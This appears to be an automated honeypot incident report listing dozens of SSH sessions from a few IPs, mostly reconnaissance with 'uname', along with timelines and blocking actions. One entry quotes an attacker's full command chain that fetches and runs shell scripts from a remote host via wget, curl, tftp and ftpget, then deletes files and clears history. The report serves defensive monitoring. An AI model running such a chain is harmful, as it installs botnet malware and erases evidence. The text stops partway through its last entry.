### 🔴 HIGH · IR-668a05bb2d0d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:18 |
| **Last Seen** | 2026-06-25 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:18:07` | `cowrie.session.connect` |
| `2026-06-25 07:18:07` | `cowrie.client.version` |
| `2026-06-25 07:18:07` | `cowrie.client.kex` |
| `2026-06-25 07:18:08` | `cowrie.login.success` |
| `2026-06-25 07:18:09` | `cowrie.session.params` |
| `2026-06-25 07:18:09` | `cowrie.command.input` |
| `2026-06-25 07:18:09` | `cowrie.log.closed` |
| `2026-06-25 07:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8a40a8abbed

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:18 |
| **Last Seen** | 2026-06-25 07:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:18:56` | `cowrie.session.connect` |
| `2026-06-25 07:18:56` | `cowrie.client.version` |
| `2026-06-25 07:18:56` | `cowrie.client.kex` |
| `2026-06-25 07:18:57` | `cowrie.login.success` |
| `2026-06-25 07:18:58` | `cowrie.session.params` |
| `2026-06-25 07:18:58` | `cowrie.command.input` |
| `2026-06-25 07:18:58` | `cowrie.log.closed` |
| `2026-06-25 07:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cea03aaf3ae

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:19 |
| **Last Seen** | 2026-06-25 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:19:04` | `cowrie.session.connect` |
| `2026-06-25 07:19:04` | `cowrie.client.version` |
| `2026-06-25 07:19:04` | `cowrie.client.kex` |
| `2026-06-25 07:19:04` | `cowrie.login.success` |
| `2026-06-25 07:19:05` | `cowrie.session.params` |
| `2026-06-25 07:19:05` | `cowrie.command.input` |
| `2026-06-25 07:19:05` | `cowrie.log.closed` |
| `2026-06-25 07:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-538ad40ec8d1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:20 |
| **Last Seen** | 2026-06-25 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:20:01` | `cowrie.session.connect` |
| `2026-06-25 07:20:01` | `cowrie.client.version` |
| `2026-06-25 07:20:01` | `cowrie.client.kex` |
| `2026-06-25 07:20:01` | `cowrie.login.success` |
| `2026-06-25 07:20:02` | `cowrie.session.params` |
| `2026-06-25 07:20:02` | `cowrie.command.input` |
| `2026-06-25 07:20:02` | `cowrie.log.closed` |
| `2026-06-25 07:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9440e9e2dd6

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:20 |
| **Last Seen** | 2026-06-25 07:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:20:09` | `cowrie.session.connect` |
| `2026-06-25 07:20:09` | `cowrie.client.version` |
| `2026-06-25 07:20:09` | `cowrie.client.kex` |
| `2026-06-25 07:20:10` | `cowrie.login.success` |
| `2026-06-25 07:20:11` | `cowrie.session.params` |
| `2026-06-25 07:20:11` | `cowrie.command.input` |
| `2026-06-25 07:20:11` | `cowrie.log.closed` |
| `2026-06-25 07:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7a4d907fe29

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:20 |
| **Last Seen** | 2026-06-25 07:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:20:36` | `cowrie.session.connect` |
| `2026-06-25 07:20:36` | `cowrie.client.version` |
| `2026-06-25 07:20:36` | `cowrie.client.kex` |
| `2026-06-25 07:20:37` | `cowrie.login.success` |
| `2026-06-25 07:20:38` | `cowrie.session.params` |
| `2026-06-25 07:20:38` | `cowrie.command.input` |
| `2026-06-25 07:20:38` | `cowrie.log.closed` |
| `2026-06-25 07:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b70114f95923

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:20 |
| **Last Seen** | 2026-06-25 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:20:58` | `cowrie.session.connect` |
| `2026-06-25 07:20:58` | `cowrie.client.version` |
| `2026-06-25 07:20:58` | `cowrie.client.kex` |
| `2026-06-25 07:20:58` | `cowrie.login.success` |
| `2026-06-25 07:20:59` | `cowrie.session.params` |
| `2026-06-25 07:20:59` | `cowrie.command.input` |
| `2026-06-25 07:20:59` | `cowrie.log.closed` |
| `2026-06-25 07:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f  (Bash Script)
   SHA256: 725d1de20672ed85f32e823fe067ed6eb17149019e146baf...
   Score : 84/100  |  VT: 36/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ chmod +x (make executable): chmod +x
   ↳ IP:Port (possible C2): 51.158.248[.]122:8517
```

### 🔴 HIGH · IR-d9b910905af7

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 07:21 |
| **Last Seen** | 2026-06-25 07:21 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp; wget hxxp://51.158.248[.]122:8517/bins.sh; curl -O hxxp://51.158.248[.]122:8517/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.158.248[.]122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.158.248[.]122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.158.248[.]122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/armv6l |
| **Malware Analysis** | 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f (HIGH), 4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02 (MEDIUM), 494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984 (MEDIUM), 6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c (MEDIUM), 80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:21:07` | `cowrie.session.connect` |
| `2026-06-25 07:21:07` | `cowrie.login.success` |
| `2026-06-25 07:21:08` | `cowrie.session.params` |
| `2026-06-25 07:21:09` | `cowrie.command.input` |
| `2026-06-25 07:21:09` | `cowrie.command.input` |
| `2026-06-25 07:21:09` | `cowrie.session.file_download` |
| `2026-06-25 07:21:10` | `cowrie.session.file_download` |
| `2026-06-25 07:21:10` | `cowrie.session.file_download` |
| `2026-06-25 07:21:10` | `cowrie.session.file_download.failed` |
| `2026-06-25 07:21:10` | `cowrie.session.file_download` |
| `2026-06-25 07:21:10` | `cowrie.session.file_download` |
| `2026-06-25 07:21:10` | `cowrie.session.file_download` |
| `2026-06-25 07:21:11` | `cowrie.session.file_download` |
| `2026-06-25 07:21:11` | `cowrie.session.file_download` |
| `2026-06-25 07:21:11` | `cowrie.session.file_download` |
| `2026-06-25 07:21:11` | `cowrie.session.file_download` |
| `2026-06-25 07:21:24` | `cowrie.log.closed` |
| `2026-06-25 07:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3284196a446a

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:21 |
| **Last Seen** | 2026-06-25 07:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:21:17` | `cowrie.session.connect` |
| `2026-06-25 07:21:17` | `cowrie.client.version` |
| `2026-06-25 07:21:17` | `cowrie.client.kex` |
| `2026-06-25 07:21:18` | `cowrie.login.success` |
| `2026-06-25 07:21:19` | `cowrie.session.params` |
| `2026-06-25 07:21:19` | `cowrie.command.input` |
| `2026-06-25 07:21:19` | `cowrie.log.closed` |
| `2026-06-25 07:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d68a3e280f6

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 07:21 |
| **Last Seen** | 2026-06-25 07:21 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:21:39` | `cowrie.session.connect` |
| `2026-06-25 07:21:40` | `cowrie.client.version` |
| `2026-06-25 07:21:40` | `cowrie.client.kex` |
| `2026-06-25 07:21:48` | `cowrie.login.success` |
| `2026-06-25 07:21:51` | `cowrie.session.params` |
| `2026-06-25 07:21:51` | `cowrie.command.input` |
| `2026-06-25 07:21:53` | `cowrie.log.closed` |
| `2026-06-25 07:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4c42a0a3024

| Field | Detail |
|---|---|
| **Source IP** | `34.156.195[.]203` |
| **First Seen** | 2026-06-25 07:21 |
| **Last Seen** | 2026-06-25 07:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:21:52` | `cowrie.session.connect` |
| `2026-06-25 07:21:52` | `cowrie.login.success` |
| `2026-06-25 07:21:52` | `cowrie.session.params` |
| `2026-06-25 07:21:52` | `cowrie.command.input` |
| `2026-06-25 07:21:52` | `cowrie.command.input` |
| `2026-06-25 07:21:52` | `cowrie.command.failed` |
| `2026-06-25 07:21:52` | `cowrie.command.input` |
| `2026-06-25 07:21:53` | `cowrie.log.closed` |
| `2026-06-25 07:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.195[.]203` to AbuseIPDB if not already reported
- [ ] Block `34.156.195[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-931b30ce3b02

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:21 |
| **Last Seen** | 2026-06-25 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:21:55` | `cowrie.session.connect` |
| `2026-06-25 07:21:55` | `cowrie.client.version` |
| `2026-06-25 07:21:55` | `cowrie.client.kex` |
| `2026-06-25 07:21:55` | `cowrie.login.success` |
| `2026-06-25 07:21:56` | `cowrie.session.params` |
| `2026-06-25 07:21:56` | `cowrie.command.input` |
| `2026-06-25 07:21:56` | `cowrie.log.closed` |
| `2026-06-25 07:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed1ebd5f8fd9

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:22 |
| **Last Seen** | 2026-06-25 07:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:22:01` | `cowrie.session.connect` |
| `2026-06-25 07:22:01` | `cowrie.client.version` |
| `2026-06-25 07:22:01` | `cowrie.client.kex` |
| `2026-06-25 07:22:01` | `cowrie.login.success` |
| `2026-06-25 07:22:02` | `cowrie.session.params` |
| `2026-06-25 07:22:02` | `cowrie.command.input` |
| `2026-06-25 07:22:02` | `cowrie.log.closed` |
| `2026-06-25 07:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-614906d64125

| Field | Detail |
|---|---|
| **Source IP** | `34.156.195[.]203` |
| **First Seen** | 2026-06-25 07:22 |
| **Last Seen** | 2026-06-25 07:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:22:05` | `cowrie.session.connect` |
| `2026-06-25 07:22:05` | `cowrie.login.success` |
| `2026-06-25 07:22:06` | `cowrie.session.params` |
| `2026-06-25 07:22:06` | `cowrie.command.input` |
| `2026-06-25 07:22:06` | `cowrie.command.failed` |
| `2026-06-25 07:22:09` | `cowrie.log.closed` |
| `2026-06-25 07:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.195[.]203` to AbuseIPDB if not already reported
- [ ] Block `34.156.195[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31f62d01138c

| Field | Detail |
|---|---|
| **Source IP** | `34.156.195[.]203` |
| **First Seen** | 2026-06-25 07:22 |
| **Last Seen** | 2026-06-25 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:22:07` | `cowrie.session.connect` |
| `2026-06-25 07:22:07` | `cowrie.login.success` |
| `2026-06-25 07:22:08` | `cowrie.session.params` |
| `2026-06-25 07:22:08` | `cowrie.command.input` |
| `2026-06-25 07:22:08` | `cowrie.log.closed` |
| `2026-06-25 07:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.195[.]203` to AbuseIPDB if not already reported
- [ ] Block `34.156.195[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f039350aaa4

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:22 |
| **Last Seen** | 2026-06-25 07:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:22:13` | `cowrie.session.connect` |
| `2026-06-25 07:22:13` | `cowrie.client.version` |
| `2026-06-25 07:22:13` | `cowrie.client.kex` |
| `2026-06-25 07:22:14` | `cowrie.login.success` |
| `2026-06-25 07:22:15` | `cowrie.session.params` |
| `2026-06-25 07:22:15` | `cowrie.command.input` |
| `2026-06-25 07:22:15` | `cowrie.log.closed` |
| `2026-06-25 07:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2761051ccd6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:22 |
| **Last Seen** | 2026-06-25 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:22:50` | `cowrie.session.connect` |
| `2026-06-25 07:22:50` | `cowrie.client.version` |
| `2026-06-25 07:22:50` | `cowrie.client.kex` |
| `2026-06-25 07:22:51` | `cowrie.login.success` |
| `2026-06-25 07:22:52` | `cowrie.session.params` |
| `2026-06-25 07:22:52` | `cowrie.command.input` |
| `2026-06-25 07:22:52` | `cowrie.log.closed` |
| `2026-06-25 07:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fde7cff32d7f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:22 |
| **Last Seen** | 2026-06-25 07:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:22:58` | `cowrie.session.connect` |
| `2026-06-25 07:22:58` | `cowrie.client.version` |
| `2026-06-25 07:22:58` | `cowrie.client.kex` |
| `2026-06-25 07:22:59` | `cowrie.login.success` |
| `2026-06-25 07:22:59` | `cowrie.session.params` |
| `2026-06-25 07:22:59` | `cowrie.command.input` |
| `2026-06-25 07:23:00` | `cowrie.log.closed` |
| `2026-06-25 07:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f46cf1bef43

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:23 |
| **Last Seen** | 2026-06-25 07:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:23:10` | `cowrie.session.connect` |
| `2026-06-25 07:23:10` | `cowrie.client.version` |
| `2026-06-25 07:23:10` | `cowrie.client.kex` |
| `2026-06-25 07:23:11` | `cowrie.login.success` |
| `2026-06-25 07:23:12` | `cowrie.session.params` |
| `2026-06-25 07:23:12` | `cowrie.command.input` |
| `2026-06-25 07:23:12` | `cowrie.log.closed` |
| `2026-06-25 07:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf9f4787de5

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:23 |
| **Last Seen** | 2026-06-25 07:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:23:12` | `cowrie.session.connect` |
| `2026-06-25 07:23:12` | `cowrie.client.version` |
| `2026-06-25 07:23:13` | `cowrie.client.kex` |
| `2026-06-25 07:23:13` | `cowrie.login.success` |
| `2026-06-25 07:23:14` | `cowrie.session.params` |
| `2026-06-25 07:23:14` | `cowrie.command.input` |
| `2026-06-25 07:23:15` | `cowrie.log.closed` |
| `2026-06-25 07:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2928f270cc9f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:23 |
| **Last Seen** | 2026-06-25 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:23:44` | `cowrie.session.connect` |
| `2026-06-25 07:23:44` | `cowrie.client.version` |
| `2026-06-25 07:23:44` | `cowrie.client.kex` |
| `2026-06-25 07:23:45` | `cowrie.login.success` |
| `2026-06-25 07:23:45` | `cowrie.session.params` |
| `2026-06-25 07:23:45` | `cowrie.command.input` |
| `2026-06-25 07:23:45` | `cowrie.log.closed` |
| `2026-06-25 07:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3fb19fa11a2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:24 |
| **Last Seen** | 2026-06-25 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:24:38` | `cowrie.session.connect` |
| `2026-06-25 07:24:38` | `cowrie.client.version` |
| `2026-06-25 07:24:38` | `cowrie.client.kex` |
| `2026-06-25 07:24:39` | `cowrie.login.success` |
| `2026-06-25 07:24:39` | `cowrie.session.params` |
| `2026-06-25 07:24:39` | `cowrie.command.input` |
| `2026-06-25 07:24:39` | `cowrie.log.closed` |
| `2026-06-25 07:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bac5505b62a

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:25 |
| **Last Seen** | 2026-06-25 07:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:25:16` | `cowrie.session.connect` |
| `2026-06-25 07:25:16` | `cowrie.client.version` |
| `2026-06-25 07:25:16` | `cowrie.client.kex` |
| `2026-06-25 07:25:17` | `cowrie.login.success` |
| `2026-06-25 07:25:18` | `cowrie.session.params` |
| `2026-06-25 07:25:18` | `cowrie.command.input` |
| `2026-06-25 07:25:18` | `cowrie.log.closed` |
| `2026-06-25 07:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbdda2cbf500

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:25 |
| **Last Seen** | 2026-06-25 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:25:34` | `cowrie.session.connect` |
| `2026-06-25 07:25:34` | `cowrie.client.version` |
| `2026-06-25 07:25:34` | `cowrie.client.kex` |
| `2026-06-25 07:25:34` | `cowrie.login.success` |
